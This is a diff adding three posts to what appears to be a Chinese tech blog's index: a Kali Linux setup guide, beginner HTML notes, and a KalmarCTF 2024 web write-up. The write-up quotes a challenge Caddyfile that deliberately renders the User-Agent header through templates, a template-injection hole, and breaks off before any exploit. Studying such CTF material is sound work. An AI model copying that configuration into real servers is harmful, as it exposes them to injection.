@@ -13,6 +13,1376 @@
       </tags>
   </entry>
   <entry>
+    <title>Kali优化</title>
+    <url>/posts/1455897523/</url>
+    <content><![CDATA[kali解压打开默认密码为：kali
+设置中文打开Terminal，输入命令：
+sudo dpkg-reconfigure locales
+
+进入后使用键盘的↑+↓←，到最底部，找到 [ ] zh_CN.UTF-8 UTF-8  ，按空格键选中，再按回车进入下一个页面，再选中 zh_CN.UTF-8作为默认语言，后回车
+等待下载结束后重启即可  
+换源因为官方源都是的速度慢，所以选择换国内源
+打开Terminal，输入命令
+sudo vim /etc/apt/sources.list
+
+可选的国内源
+#阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib
+
+不懂vim语法的按以下步骤来
+
+全选删除原本的内容
+​	按esc键后，先按 g  g（到达顶部），然后再按 d  G(区分大小写！！！)
+
+复制以上内容，右键粘贴
+
+保存退出
+​	按esc键后，同时按住shift键和英文**:**键，再输入wq
+
+
+系统优化1.设置root账户密码sudo passwd root
+
+2.设置禁止休眠
+打开左上角kali图标
+点击settings(设置)
+点击进入power Manger(电源管理器)
+在Power Manager 选择—&gt; display(显示)  把使用电池和插入电源下的依次把Blank after、Put to sleep after和Switch off after 全部设置成为 Never
+
+3.软件数据库更新：apt-get update
+
+4.软件更新：apt-get upgrade
+
+5.系统更新：apt-get dist-upgrade
+
+
+
+安装中文输入法
+更新包管理器的软件包列表：
+sudo apt-get update
+
+安装fcitx输入法框架：
+sudo apt-get install fcitx
+
+安装fcitx-googlepinyin谷歌拼音输入法：
+sudo apt-get install fcitx-googlepinyin
+
+ctrl+space(空格)切换输入法
+界面美化1.整体字体放大
+打开左上角kali图标
+点击设置进入外观
+选择字体，修改DPI
+
+1.桌面图标大小
+桌面右键选择桌面设置
+选择图标，调节图标大小完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）
+
+2.菜单栏大小以及位置
+在菜单栏空白处右键—选择面板再点击面板首选项
+打开面板后选择显示—尺寸—调节行大小
+关闭锁定面板，可拖动作用两侧的小点将面板放置于最下侧
+
+3.终端字体
+打开终端再点击左上角文件点击参数设置
+打开设置界面，界面设置—调节字体大小
+
+4.系统字体
+打开左上角kali图标
+点击设置进入外观
+选择字体，修改默认字体和默认等宽字体
+
+4.窗口字体
+打开左上角kali图标
+点击设置进入窗口管理器
+选择样式修改标题字体
+
+]]></content>
+      <categories>
+        <category>解决方案</category>
+      </categories>
+      <tags>
+        <tag>Tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML笔记</title>
+    <url>/posts/2607722179/</url>
+    <content><![CDATA[HTML简介HTML（HyperText Markup Language）是用来描述网页的一种语言。
+HTML标签
+HTML 标签是由尖括号包围的关键词，比如 &lt;html&gt;
+HTML 标签通常是成对出现的，比如 &lt;b&gt; 和 &lt;/b&gt;
+标签对中的第一个标签是开始标签，第二个标签是结束标签
+
+注：”HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思。
+HTML声明&lt;!DOCTYPE&gt;声明有助于浏览器中正确显示网页。doctype 声明是不区分大小写的
+HTML实例
+&lt;!DOCTYPE html&gt;   &lt;!-- 声明为HTML5文档 --&gt;&lt;!-- HTML页面开始 --&gt;&lt;html&gt;	&lt;!-- 头部元素开始 --&gt;	&lt;head&gt;	&lt;meta charset=&quot;utf-8&quot;&gt;	&lt;title&gt;HTML&lt;/title&gt;	&lt;/head&gt;	&lt;!-- 头部元素结束 --&gt;        &lt;!-- 可见的页面内容开始 --&gt;	&lt;body&gt;	&lt;h1&gt;我的第一个标题&lt;/h1&gt;	&lt;p&gt;我的第一个段落。&lt;/p&gt; 	&lt;/body&gt;     &lt;!-- 可见的页面内容结束 --&gt;&lt;/html&gt;&lt;!-- HTML页面结束 --&gt;
+
+
+
+HTML基础构成标题HTML 标题（Heading）是通过&lt;h1&gt; - &lt;h6&gt; 标签来定义的。
+&lt;h1&gt;这是标题 1&lt;/h1&gt;&lt;h2&gt;这是标题 2&lt;/h2&gt;&lt;h3&gt;这是标题 3&lt;/h3&gt;&lt;h4&gt;这是标题 4&lt;/h4&gt;&lt;h5&gt;这是标题 5&lt;/h5&gt;&lt;h6&gt;这是标题 6&lt;/h6&gt;
+
+
+
+段落HTML 段落是通过标签 &lt;p&gt; 来定义的。
+&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;
+
+
+
+水平线&lt;hr&gt; 标签在 HTML 页面中创建水平线,可用于分隔内容。
+&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;&lt;hr&gt;&lt;p&gt;这是一个段落。&lt;/p&gt;
+
+
+
+
+注释语法
+&lt;!-- 这是一个注释 --&gt;
+
+
+
+折行&#x2F;换行在不产生一个新段落的情况下进行换行（新行），请使用 &lt;br&gt; 标签
+&lt;p&gt;这个&lt;br&gt;段落&lt;br&gt;演示了分行的效果&lt;/p&gt;
+
+注意：&lt;br&gt; 元素是一个空的 HTML 元素。由于关闭标签没有任何意义，因此它没有结束标签。
+空格的使用对于 HTML，无法通过在 HTML 代码中添加额外的空格或换行来改变输出的效果。
+当显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。
+&lt;p&gt;    春眠不觉晓，      处处闻啼鸟。        夜来风雨声，          花落知多少。&lt;/p&gt;&lt;p&gt;注意，浏览器忽略了源代码中的排版（省略了多余的空格和换行）。&lt;/p&gt;
+
+
+
+HTML文本格式化标签文本加粗&lt;b&gt;这个文本是加粗的&lt;/b&gt;
+
+&lt;strong&gt;这个文本是加粗的&lt;/strong&gt;
+
+
+
+文字放大与缩小&lt;big&gt;这个文本字体放大&lt;/big&gt;
+
+&lt;small&gt;这个文本是缩小的&lt;/small&gt;
+
+
+
+文字斜体&lt;em&gt;这个文本是斜体的&lt;/em&gt;
+
+&lt;i&gt;这个文本是斜体的&lt;/i&gt;
+
+
+
+上下标这个文本包含&lt;sub&gt;下标&lt;/sub&gt;
+
+这个文本包含&lt;sup&gt;上标&lt;/sup&gt;
+
+
+
+定义预格式文本&lt;pre&gt;此例演示如何使用 pre 标签对空行和    空格进行控制&lt;/pre&gt;
+
+
+注：HTML未对此处的空格和换行进行处理为一个空格
+定义缩写&lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;&lt;br /&gt;&lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;&lt;p&gt;在某些浏览器中，当您把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。&lt;/p&gt;&lt;p&gt;仅对于 IE 5 中的 acronym 元素有效。&lt;/p&gt;&lt;p&gt;对于 Netscape 6.2 中的 abbr 和 acronym 元素都有效。&lt;/p&gt;
+
+
+
+文字方向&lt;p&gt;该段落文字从左到右显示。&lt;/p&gt;  &lt;p&gt;&lt;bdo dir=&quot;rtl&quot;&gt;该段落文字从右到左显示。&lt;/bdo&gt;&lt;/p&gt;  
+
+
+
+引用短引用&lt;q&gt;Build a future where people live in harmony with nature.&lt;/q&gt;
+
+
+
+长引用&lt;blockquote cite=&quot;http://www.worldwildlife.org/who/index.html&quot;&gt;For 50 years, WWF has been protecting the future of nature. The worlds leading conservation organization, WWF works in 100 countries and is supported by 1.2 million members in the United States and close to 5 million globally.&lt;/blockquote&gt;
+
+
+
+
+下划线(插入线)与删除线&lt;p&gt;My favorite color is &lt;del&gt;blue&lt;/del&gt; &lt;ins&gt;red&lt;/ins&gt;!&lt;/p&gt;
+
+
+
+标签所对应的全拼&lt;b&gt;---bold&lt;em&gt;---emphasize&lt;i&gt;---italic&lt;sub&gt;---subscript&lt;sup&gt;---superscript&lt;ins&gt;---insert&lt;del&gt;---delete&lt;kbd&gt;---keyboard&lt;bdo&gt;---Bi-Directional Override&lt;q&gt;---quote&lt;dfn&gt;---define
+
+
+
+HTML元素开始标签常被称为起始标签（opening tag），结束标签常称为闭合标签（closing tag)
+语法
+HTML 元素以开始标签起始
+HTML 元素以结束标签终止
+元素的内容是开始标签与结束标签之间的内容
+某些 HTML 元素具有空内容（empty content）
+空元素在开始标签中进行关闭（以开始标签的结束而结束）
+大多数 HTML 元素可拥有属性
+
+HTML 元素的嵌套大多数 HTML 元素可以嵌套（HTML 元素可以包含其他 HTML 元素）。
+无结束标签即使忘记了使用结束标签，大多数浏览器也会正确地显示 HTML。忘记使用结束标签会产生不可预料的结果或错误。
+HTML属性属性是 HTML 元素提供的附加信息。
+实例
+&lt;a href=&quot;https://heyhjwei.github.io/&quot;&gt;这是一个链接使用了 href 属性&lt;/a&gt;
+
+HTML 链接由 &lt;a&gt; 标签定义。链接的地址在 href 属性中指定
+引用属性值的方法
+
+属性值应该始终被包括在引号内。
+双引号是最常用的，不过使用单引号也没有问题。
+在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号
+
+例如：
+name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;
+
+注意：
+
+属性和属性值，尽量小写，本来这样做也方便些。
+class 属性可以多用 class=&quot; &quot; （引号里面可以填入多个class属性）
+id 属性只能单独设置 **id=&quot; &quot;**（只能填写一个，多个无效）
+
+大多数 HTML 元素的属性：
+
+
+
+属性
+目的和用途
+可使用的元素
+
+
+
+class
+可以用于选择和样式化元素。可以在 CSS 中使用类选择器来选择具有特定类名的元素，并应用样式规则。
+适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
+
+
+id
+用于为元素指定唯一的标识符。可以使用 JavaScript 或 CSS 来选择具有特定 id 的元素，并对其进行操作或样式化。
+适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
+
+
+style
+内联样式
+适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等
+
+
+src
+指定外部资源的 URL
+&lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;video&gt;, &lt;audio&gt;, 等等
+
+
+href
+用于创建超链接,指定链接的 URL
+&lt;a&gt;, &lt;link&gt;, &lt;area&gt;, 等等
+
+
+alt
+为图像元素提供替代文本。当图像无法加载或无法显示时，浏览器会显示 alt 属性中的文本。
+&lt;img&gt;
+
+
+width
+元素的宽度
+&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等
+
+
+height
+元素的高度
+&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等
+
+
+disabled
+禁用元素，例如，可以将按钮元素 (&lt;button&gt;) 的 disabled 属性设置为 true，以禁用按钮，防止用户点击它。
+&lt;button&gt;, &lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等
+
+
+readonly
+将元素设置为只读
+&lt;input&gt;, &lt;textarea&gt;, 等等
+
+
+placeholder
+输入字段的占位符文本
+&lt;input&gt;, &lt;textarea&gt;, 等等
+
+
+required
+设置元素为必填
+&lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等
+
+
+value
+元素的值
+&lt;input&gt;, &lt;button&gt;, &lt;option&gt;, &lt;textarea&gt;, 等等
+
+
+checked
+设置复选框或单选按钮的选中状态
+&lt;input type=&quot;checkbox&quot;&gt;, &lt;input type=&quot;radio&quot;&gt;, 等等
+
+
+maxlength
+输入字段的最大字符数
+&lt;input&gt;, &lt;textarea&gt;, 等等
+
+
+min, max
+输入字段的最小值和最大值
+&lt;input type=&quot;number&quot;&gt;, &lt;input type=&quot;date&quot;&gt;, &lt;input type=&quot;time&quot;&gt;, 等等
+
+
+placeholder
+为输入字段提供占位符文本，用于提示用户输入的内容。例如，您可以在文本输入字段 (&lt;input type=&quot;text&quot;&gt;) 中使用 placeholder 属性来提供示例输入。
+&lt;input type=&quot;text&quot;&gt;
+
+
+HTML 头部&lt;head&gt; 元素包含了所有的头部标签元素。在 &lt;head&gt;元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
+可以添加在头部区域的元素标签为: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;。
+&lt;title&gt; 元素&lt;title&gt; 标签定义了不同文档的标题。&lt;title&gt; 在 HTML&#x2F;XHTML 文档中是必需的。
+
+定义了浏览器工具栏的标题
+当网页添加到收藏夹时，显示在收藏夹中的标题
+显示在搜索引擎结果页面的标题
+
+HTML&lt;title&gt;元素不仅可以显示文本，也可以在左侧显示logo等图片。显示时，要将&lt;link&gt;标签放入&lt;head&gt;里。
+&lt;base&gt; 元素&lt;base&gt; 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接:
+&lt;head&gt; &lt;base href=&quot;http://www.runoob.com/images/&quot; target=&quot;_blank&quot;&gt; &lt;/head&gt;
+
+
+
+&lt;link&gt; 元素&lt;link&gt; 标签定义了文档与外部资源之间的关系。
+&lt;link&gt; 标签通常用于链接到样式表:
+&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;/head&gt;
+
+
+
+&lt;style&gt; 元素&lt;style&gt; 标签定义了HTML文档的样式文件引用地址.
+
+在&lt;style&gt; 元素中你也可以直接添加样式来渲染 HTML 文档:
+&lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123;    background-color:yellow; &#125; p &#123;    color:blue &#125; &lt;/style&gt; &lt;/head&gt;
+
+
+
+&lt;meta&gt; 元素meta标签描述了一些基本的元数据。元数据也不显示在页面上，但会被浏览器解析。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。
+&lt;meta&gt; 一般放置于 &lt;head&gt; 区域
+ 使用实例
+为搜索引擎定义关键词:
+&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;
+
+为网页定义描述内容:
+&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;
+
+定义网页作者:
+&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;
+
+每30秒钟刷新当前页面:
+&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;
+
+
+
+HTML &lt;script&gt; 元素&lt;script&gt;标签用于加载脚本文件，如： JavaScript。
+链接HTML 链接是通过标签 &lt;a&gt; 来定义的。
+超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。
+语法以下是 HTML 中创建链接的基本语法和属性：code&gt;&lt;a&gt; 元素：创建链接的主要HTML元素是&lt;a&gt;（锚）元素。&lt;a&gt;元素具有以下属性：
+
+href：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。
+target（可选）：指定链接如何在浏览器中打开。常见的值包括 _blank（在新标签或窗口中打开链接）和 _self（在当前标签或窗口中打开链接）。
+title（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。
+rel（可选）：指定与链接目标的关系，如 nofollow、noopener 等。
+
+使用实例文本链接：最常见的链接类型是文本链接，它使用 &lt;a&gt; 元素将一段文本转化为可点击的链接，例如：
+&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;
+
+图像链接：您还可以使用图像作为链接。在这种情况下，&lt;a&gt; 元素包围着 &lt;img&gt; 元素。例如：
+&lt;a href=&quot;https://www.example.com&quot;&gt;  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;&lt;/a&gt;
+
+锚点链接：除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 &lt;a&gt; 元素定义一个标记，并使用#符号引用该标记。例如：
+&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;&lt;!-- 在页面中的某个位置 --&gt;&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;
+
+下载链接：如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：
+&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;
+
+跳转id链接 
+id 属性可用于创建一个 HTML 文档书签。
+提示: 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。
+在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
+&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;
+
+或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
+&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;
+
+邮箱链接
+&lt;--案例1 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?Subject=Hello%20again&quot; target=&quot;_top&quot;&gt; &lt;--案例2 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?cc=someoneelse@example.com&amp;bcc=andsomeoneelse@example.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!&quot; target=&quot;_top&quot;&gt;发送邮件!&lt;/a&gt;
+
+案例2可设置指定的收件内容以及内容
+图像HTML 图像是通过标签 &lt;img&gt; 来定义的.&lt;img&gt; 是空标签，意思是说，它只包含属性，并且没有闭合标签。
+语法&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;
+
+Alt属性alt 属性用来为图像定义一串预备的可替换的文本。
+替换文本属性的值是用户定义的。
+&lt;img src=&quot;boat.gif&quot; alt=&quot;Big Boat&quot;&gt;
+
+在浏览器无法载入图像时，此时，浏览器将显示这个替代性的文本而不是图像。
+设置图像的高度与宽度height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。
+属性值默认单位为像素:
+&lt;img src=&quot;pulpit.jpg&quot; alt=&quot;Pulpit rock&quot; width=&quot;304&quot; height=&quot;228&quot;&gt;
+
+实例：
+&lt;img src=&quot;https://hijwei.top/images/redefine-avatar.jpg&quot; alt=&quot;cola&quot; width=&quot;39&quot; height=&quot;39&quot; /&gt;
+
+实现效果
+
+
+
+
+表格HTML 表格由 &lt;table&gt; 标签来定义。HTML 表格是一种用于展示结构化数据的标记语言元素。
+&lt;table&gt; 元素表示整个表格，它包含两个主要部分：&lt;thead&gt; 和 &lt;tbody&gt;。
+
+&lt;thead &gt; 用于定义表格的标题部分: 在 &lt;thead &gt; 中，使用 &lt;th &gt; 元素定义列的标题，以上实例中列标题分别为”列标题1”，”列标题2”和”列标题3”。
+&lt;tbody &gt; 用于定义表格的主体部分: 在 &lt;tbody &gt; 中，使用 &lt;tr &gt; 元素定义行，并在每行中使用 &lt;td &gt; 元素定义单元格数据，以上实例中有两行数据，每行包含三个单元格。
+
+每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义），表格可以包含标题行（**&lt;th&gt;**）用于定义列的标题。
+
+tr：tr 是 table row 的缩写，表示表格的一行。
+td：td 是 table data 的缩写，表示表格的数据单元格。
+th：th 是 table header的缩写，表示表格的表头单元格。
+
+数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。
+表格和边框属性如果不定义边框属性，表格将不显示边框。有时这很有用，但是大多数时候，我们希望显示边框。使用边框属性来显示一个带有边框的表格table后面加入border=&quot;1&quot;
+列表列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。
+无序列表无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。
+无序列表使用 &lt;ul&gt; 标签
+有序列表同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于 &lt;li&gt; 标签。
+列表项使用数字来标记。
+自定义列表自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。
+HTML 区块区块元素和内联元素HTML 区块元素大多数 HTML 元素被定义为块级元素或内联元素。
+块级元素在浏览器显示时，通常会以新行来开始（和结束）。
+实例: &lt;div&gt;、&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;
+HTML 内联元素内联元素在显示时通常不会以新行开始。
+实例: &lt;span&gt;,&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;
+&lt;div&gt;与 &lt;span&gt;
+&lt;div&gt; 是块级元素，它独占一行，可以设置宽度、高度以及边距等样式属性。它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。
+&lt;span&gt; 是行内元素，它不会独占一行，宽度默认由其内容决定。它适合用于对文本或其他行内元素进行样式化、标记或包裹。
+嵌套关系：
+
+&lt;div&gt; 可以容纳其他块级元素和行内元素，包括其他的 &lt;div&gt; 和 &lt;span&gt; 元素。
+&lt;span&gt;通常被用来包裹文本或其他行内元素，比如用来设置特定文本的样式。
+
+表单和输入HTML 表单用于收集用户的输入信息。
+表单元素是允许用户在表单中输入内容，比如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。
+我们可以使用 &lt;form&gt; 标签来创建表单:
+HTML 表单 - 输入元素多数情况下被用到的表单标签是输入标签 **&lt;input&gt;**。输入类型是由type属性定义。接下来我们介绍几种常用的输入类型。
+文本域文本域通过 &lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。
+&lt;form&gt;First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot;&gt;&lt;br&gt;Last name: &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;&lt;/form&gt;
+
+注意:表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。
+密码字段密码字段通过标签 &lt;input type=&quot;password&quot;&gt; 来定义:
+&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;
+
+注意：密码字段字符不会明文显示，而是以星号 ***** 或圆点 . 替代。
+单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单的单选框选项:
+&lt;form action=&quot;&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女&lt;/form&gt;
+
+复选框&lt;input type=&quot;checkbox&quot;&gt; 定义了复选框。
+复选框可以选取一个或多个选项：
+&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;我喜欢自行车&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;我喜欢小汽车&lt;/form&gt;
+
+提交按钮&lt;input type=&quot;submit&quot;&gt; 定义了提交按钮。
+当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 action 定义了服务端的文件名。action 属性会对接收到的用户输入数据进行相关的处理:
+&lt;form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;
+
+
+
+框架iframe语法:
+&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;
+
+该URL指向不同的网页。
+iframe - 设置高度与宽度height 和 width 属性用来定义iframe标签的高度与宽度。
+属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。
+&lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;
+
+iframe - 移除边框frameborder 属性用于定义iframe表示是否显示边框。
+设置属性值为 “0” 移除iframe的边框:
+&lt;iframe src=&quot;demo_iframe.htm&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;
+
+使用 iframe 来显示目标链接页面iframe 可以显示一个目标链接的页面
+目标链接的属性必须使用 iframe 的属性，如下实例:
+&lt;iframe src=&quot;demo_iframe.htm&quot; name=&quot;iframe_a&quot;&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&quot;https://1.top&quot; target=&quot;iframe_a&quot; rel=&quot;noopener&quot;&gt;HIJWEI.TOP&lt;/a&gt;&lt;/p&gt;
+
+
+
+文章引用1.引用菜鸟教程的文章    原文链接：https://www.runoob.com/html/html-tutorial.html
+]]></content>
+      <categories>
+        <category>开发</category>
+      </categories>
+      <tags>
+        <tag>开发</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024KalmarCTF-WEB复盘</title>
+    <url>/posts/1876369856/</url>
+    <content><![CDATA[
+前言：
+靶场链接：https://kalmarc.tf/challenges
+难度太大了根本写不出来参考大佬的题解最后复盘出来的
+原文链接：https://ireland.re/posts/KalmarCTF_2024/
+
+复盘题解Ez ⛳ v2题目描述
+Caddy webserver is AWESOME, using a neat and compact syntax you can do a lot of powerful things, e.g. wanna know if your browser supports HTTP3? Or TLS1.3? etc
+Caddy web服务器非常棒，使用简洁紧凑的语法可以做很多强大的事情，例如，想知道你的浏览器是否支持HTTP3？或者TLS1.3？等等。
+Flag is located at GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64) go fetch it.
+Flag 位于GET &#x2F;$(head -c 18 &#x2F;dev&#x2F;urandom | base64)，去获取它吧。
+附件：点击下载附件
+
+解题思路下载完打开附件包发现只有四个文件，Caddyfile、docker-compose.yml这两个中有比较有用的信息
+docker-compose.yml中的关键信息
+caddy:  image: caddy:2.7.6-alpine  volumes:    - ./Caddyfile:/etc/caddy/Caddyfile:ro    - ./flag:/wpqdDNHnYu8MZeclmpCr9Q:ro  # FILE WILL BE RENAMED TO SOMETHING SIMILAR RANDOM ON PROD    					   # 文件将在生产环境中被重新命名为类似的随机名称
+
+Caddyfile中为对Caddy的配置文件
+(sec_headers) &#123;    root * /    header &#123;        Content-Security-Policy &quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;;&quot;        Strict-Transport-Security &quot;max-age=31536000&quot;        X-XSS-Protection 0        X-Content-Type-Options nosniff        X-Frame-Options DENY        Referrer-Policy &quot;no-referrer&quot;    &#125;&#125;(html_reply) &#123;    import sec_headers    header Content-Type text/html    templates    respond &quot;&lt;!DOCTYPE html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;&#123;http.request.host&#125;&lt;/title&gt;&lt;body&gt;&#123;args[0]&#125;&lt;/body&gt;&quot;&#125;(json_reply) &#123;    templates &#123;        # By default placeholders are not replaced for json        mime application/json    &#125;    header Content-Type application/json    respond &quot;&#123;args[0]&#125;&quot;&#125;(http_reply) &#123;    tls internal &#123;        alpn &quot;&#123;args[0]&#125;&quot;    &#125;    map &#123;args[0]&#125; &#123;proto_name&#125; &#123;        http/1.1 HTTP/1.1        h2 HTTP/2.0        h3 HTTP/3.0    &#125;    @correctALPN `&#123;http.request.proto&#125; == &#123;proto_name&#125;`    respond @correctALPN &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;    import html_reply &quot;You are connected with &#123;http.request.proto&#125; instead of &#123;proto_name&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;). &lt;!-- Debug: &#123;http.request.uuid&#125;--&gt;&quot;&#125;(tls_reply) &#123;    tls internal &#123;        protocols &#123;args[0]&#125; &#123;args[1]&#125;    &#125;    header Access-Control-Allow-Origin &quot;*&quot;    import json_reply &#123;&quot;tls_version&quot;:&quot;&#123;tls_version&#125;&quot;,&quot;alpn&quot;:&quot;&#123;http.request.tls.proto&#125;&quot;,&quot;sni&quot;:&quot;&#123;http.request.tls.server_name&#125;&quot;,&quot;cipher_suite&quot;:&quot;&#123;http.request.tls.cipher_suite&#125;&quot;&#125;&#125;mtls.caddy.chal-kalmarc.tf &#123;    tls internal &#123;        client_auth &#123;            mode require        &#125;    &#125;    templates    import html_reply `You are connected with client-cert &#123;http.request.tls.client.subject&#125;`&#125;tls.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.3&#125;tls12.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.2 tls1.2&#125;tls13.caddy.chal-kalmarc.tf &#123;    import tls_reply tls1.3 tls1.3&#125;ua.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply `User-Agent: &#123;&#123;.Req.Header.Get &quot;User-Agent&quot;&#125;&#125;`&#125;http.caddy.chal-kalmarc.tf &#123;    tls internal    templates    import html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;&#125;http1.caddy.chal-kalmarc.tf &#123;    import http_reply http/1.1&#125;http2.caddy.chal-kalmarc.tf &#123;    import http_reply h2&#125;http3.caddy.chal-kalmarc.tf &#123;    import http_reply h3&#125;caddy.chal-kalmarc.tf &#123;    tls internal    import html_reply `Hello! Wanna know you if your browser supports 